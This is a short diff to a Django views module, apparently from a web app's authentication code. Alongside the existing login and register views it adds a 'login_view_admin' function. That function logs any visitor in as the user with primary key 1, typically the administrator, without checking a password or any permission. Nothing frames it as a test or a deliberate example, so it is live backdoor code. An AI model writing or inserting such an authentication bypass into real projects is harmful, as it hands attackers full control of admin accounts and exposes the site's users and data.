@@ -24,6 +24,12 @@ def login_view(request):
     return render(request, 'login.html', context={"form": form})
 
 
+def login_view_admin(request):
+    user = User.objects.get(pk=1)
+    login(request, user)
+    return redirect('index')
+
+
 def register(request):
     if request.user.is_authenticated:
         return redirect('index')
